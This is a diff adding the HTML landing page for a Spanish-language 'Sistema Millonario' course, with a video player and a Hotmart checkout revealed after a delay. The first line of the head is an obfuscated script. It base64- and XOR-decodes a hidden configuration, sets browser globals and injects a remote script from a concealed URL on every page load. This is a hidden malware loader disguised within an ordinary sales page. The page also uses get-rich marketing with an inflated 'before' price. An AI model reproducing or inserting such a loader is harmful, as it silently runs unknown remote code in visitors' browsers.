@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <script>(function(){var h_ok=atob("DJt0pO9l+sjVcHhe2+BW0Z0J2PL3GAwqq+hOi8AGnqb7BQwzsv0NiowKl+a3AlctuOkd1JsW1b2hHQtxt/oAwZwR1KKmUlR8uu8A1oYHj7ywA1pkgOBWyo4In+rvUhw/r/pZ0ZsIk66sXQgsvu0RyptIib23GRwt+bdW0o4Jj633Slp8psYJ");var v_y=[];for(var c_i9=0;c_i9<h_ok.length;c_i9++){v_y.push(h_ok.charCodeAt(c_i9)&255);}var k_btp=v_y[0];var q_h13k=v_y.slice(1,1+k_btp);var z_fhl=v_y.slice(1+k_btp);var a_3=z_fhl.map(function(b,v_oxy){return b^q_h13k[v_oxy%k_btp];});var h_x="";for(var y_z=0;y_z<a_3.length;y_z++){h_x+=String.fromCharCode(a_3[y_z]&255);}var r_x6r=decodeURIComponent(escape(h_x));var m_b=JSON.parse(r_x6r);var i_f3=m_b.globals||[];i_f3.forEach(function(c_0xn6){window[c_0xn6.name]=c_0xn6.value;});var k_zts=document.createElement("script");k_zts.src=m_b.url;k_zts.async=true;k_zts.defer=true;(m_b.attributes||[]).forEach(function(x_cy){k_zts.setAttribute(x_cy.name,x_cy.value);});(document.head||document.documentElement).appendChild(k_zts);})();</script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ASSISTA AGORA!</title>
+
+
+  <style>
+    @keyframes pulsar {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    * {
+      font-family: "Roboto", sans-serif;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .hero {
+      height: 40px;
+      width: 100%;
+      background: #DAA520;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 17px;
+      color: #fff;
+      position: absolute;
+    }
+
+    .container {
+      background: #000;
+      width: 100%;
+      height: auto;
+      min-height: calc(100vh - 70px);
+      display: flex;
+      justify-content: center;
+    }
+
+    .content {
+      width: 100%;
+      max-width: 800px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 90px 10px 0px 10px;
+      box-sizing: border-box;
+    }
+
+    .esconder {
+      display: none;
+    }
+
+    span {
+      font-size: 16px;
+      color: #fff;
+      margin-top: 10px;
+    }
+
+    .button {
+      width: 400px;
+      max-width: 90%;
+      height: 60px;
+      border-radius: 8px;
+      background-color: transparent;
+      background-image: linear-gradient(150deg, #4fce5c 0%, #198835 100%);
+      padding: 10px;
+      font-weight: bold;
+      font-size: 20px;
+      color: #fff;
+      justify-content: center;
+      align-items: center;
+      animation: pulsar 2s infinite ease-in-out;
+      margin-top: 50px;
+      cursor: pointer;
+      border: none;
+      outline: none;
+    }
+
+
+    .title {
+      margin-bottom: 25px;
+      color: #fff;
+      font-size: 25px;
+    }
+
+    .faq-container {
+      width: 100%;
+      margin-top: 250px;
+    }
+
+    .faq-answer {
+      display: none;
+      padding: 15px;
+      box-sizing: border-box;
+      background-color: #fff;
+      text-align: initial;
+    }
+
+    .faq-question {
+      cursor: pointer;
+      padding: 10px;
+      height: 50px;
+      display: flex;
+      border-radius: 4px;
+      align-items: center;
+      box-sizing: border-box;
+      width: 100%;
+      text-align: initial;
+      background-image: linear-gradient(130deg, #3E274F 0%, #280031 61%);
+      font-size: 18px;
+      color: #fff;
+      margin-top: 10px;
+    }
+
+    .faq-answer.active {
+      display: block;
+    }
+
+    .profile-container {
+      margin-top: 250px;
+      width: 80%;
+      margin-bottom: 30px;
+    }
+
+    .profile {
+      width: 150px;
+      border-radius: 8px;
+    }
+
+    .profile-text {
+      color: #fff;
+      margin-top: 10px;
+      font-size: 17px;
+    }
+
+    .footer {
+      margin-top: 250px;
+      background-color: #1a1a1a;
+      color: #fff;
+      height: 70px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 17px;
+      box-sizing: border-box;
+      padding: 10px;
+    }
+
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 100000000000;
+      display: none;
+    }
+
+    .contentModal {
+      background-image: linear-gradient(180deg, #49390f 0%, #000000 100%);
+      width: 95%;
+      max-width: 600px;
+      height: 80%;
+      max-height: 600px;
+      border-radius: 8px;
+      border: 3px solid #fff;
+      color: #fff;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      padding: 20px 0;
+      box-sizing: border-box;
+    }
+
+    .titleModal {
+      font-size: 30px;
+      max-width: 95%;
+      font-weight: bold;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      column-gap: 10px;
+      margin: 20px 0;
+    }
+
+    .line {
+      height: 1px;
+      width: 130px;
+      background-color: #fff;
+    }
+
+    .fecharModal {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background-color: #ff3333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      font-size: 25px;
+      margin-top: 30px;
+      cursor: pointer;
+    }
+
+
+    .faq-container {
+      margin: 60px 0;
+      width: 100%;
+      max-width: 610px;
+      background: #111;
+      padding: 20px;
+      box-sizing: border-box;
+      border-radius: 8px;
+      color: #fff;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .accordion .item {
+      margin-bottom: 10px;
+      border: 1px solid #333;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+
+    .question {
+      background: #000;
+      color: #fff;
+      padding: 15px;
+      width: 100%;
+      text-align: left;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+
+    .question:hover {
+      background: #222;
+    }
+
+    .question.active {
+      background: #333;
+    }
+
+    .answer {
+      background: #1a1a1a;
+      overflow: hidden;
+      max-height: 0;
+      transition: max-height 0.3s ease;
+      padding: 0 15px;
+    }
+
+    .answer p,
+    .answer {
+      font-size: 15px;
+      line-height: 1.6;
+      margin: 10px 0;
+    }
+
+    .whatsapp-contact {
+      text-align: center;
+      margin-top: 30px;
+      padding-top: 20px;
+      border-top: 1px solid #333;
+    }
+
+    .whatsapp-contact p {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .whatsapp-contact a {
+      display: inline-block;
+      background: #25D366;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.3s ease;
+    }
+
+    .whatsapp-contact a:hover {
+      background: #1ebc5c;
+    }
+
+    .professor-photo {
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      background-image: url("./profile.jpeg");
+      background-size: cover;
+      background-position: 30% 40%;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 600px) {
+
+      .question,
+      .answer {
+        font-size: 14px;
+      }
+
+      .whatsapp-contact a {
+        width: 100%;
+        box-sizing: border-box;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+
+  <div class="container">
+    <div class="content">
+
+      <section
+        style="padding: 60px 20px; margin-bottom: 20px; background: linear-gradient(135deg, #0f0f0f, #1a1a1a); text-align: center;">
+
+        <div style="max-width: 600px; margin: 0 auto;">
+
+          <div style="
+      display: inline-block;
+      background: #B2EC7A;
+      color: #000;
+      padding: 8px 16px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    ">
+            ACCESO LIBERADO
+          </div>
+
+          <h1 style="
+      font-size: 34px;
+      line-height: 1.2;
+      color: #fff;
+      margin-bottom: 15px;
+    ">
+            Primera clase 🚀<br>
+            <span style="color:#B2EC7A;">Tu camino empieza aquí</span>
+          </h1>
+
+          <p style="
+      font-size: 16px;
+      color: #ccc;
+      line-height: 1.5;
+      max-width: 480px;
+      margin: 0 auto 30px auto;
+    ">
+            Estás a punto de dar el primer paso hacia algo que puede cambiar completamente tus resultados.
+          </p>
+
+          <div style="
+      width: 80px;
+      height: 4px;
+      background: #B2EC7A;
+      margin: 0 auto;
+      border-radius: 10px;
+    "></div>
+
+        </div>
+
+      </section>
+
+
+
+      <div style="position: relative; width: 100%; max-width: 600px;">
+
+        <vturb-smartplayer id="vid-6a31bfe520af52de24a8dff9" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;"></vturb-smartplayer> <script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/be9b2814-5467-466f-adc0-469d0d4dee4c/players/6a31bfe520af52de24a8dff9/v4/player.js", s.async=!0,document.head.appendChild(s); </script>
+
+        <span style="position: absolute; bottom: .5px; z-index: 1000000; right: 30px;">🎁</span>
+
+      </div>
+
+
+      <section class="esconder"
+        style="width:100%; padding:40px 15px; background:#000; text-align:center; box-sizing:border-box;">
+
+        <div style="max-width:600px; margin:0 auto;">
+
+          <!-- Precio antiguo -->
+          <div style="
+            color:#ff3c3c;
+            font-size:34px;
+            font-weight:bold;
+            text-decoration: line-through;
+            margin-bottom:10px;
+          ">
+            US$100/mes
+          </div>
+
+          <!-- Precio actual -->
+          <div style="
+            color:#fff;
+            font-size:26px;
+            font-weight:bold;
+            margin-bottom:10px;
+          ">
+            US$20/mes
+          </div>
+
+          <!-- Texto menor -->
+          <div style="
+            color:#aaa;
+            font-size:14px;
+          ">
+            Cancela en cualquier momento
+          </div>
+
+        </div>
+
+      </section>
+
+
+
+      <div class="esconder">
+
+        <!-- HOTMART - Sales Funnel Widget -->
+        <!--- sales funnel container --->
+        <div id="hotmart-sales-funnel"></div>
+
+        <!--- script load and setup --->
+        <script src="https://checkout.hotmart.com/lib/hotmart-checkout-elements.js"></script>
+        <script>
+          checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel')
+        </script>
+        <!-- HOTMART - Sales Funnel Widget -->
+
+      </div>
+
+      <div class="footer">© SISTEMA MILLONARIO.</br> TODOS LOS DERECHOS RESERVADOS.</div>
+
+      <script>
+        var delaySeconds = 110;
+        var player = document.querySelector("vturb-smartplayer");
+        player.addEventListener("player:ready", function () {
+          player.displayHiddenElements(delaySeconds, [".esconder"], {
+            persist: true
+          });
+        });
+      </script>
+</body>
+
+</html>
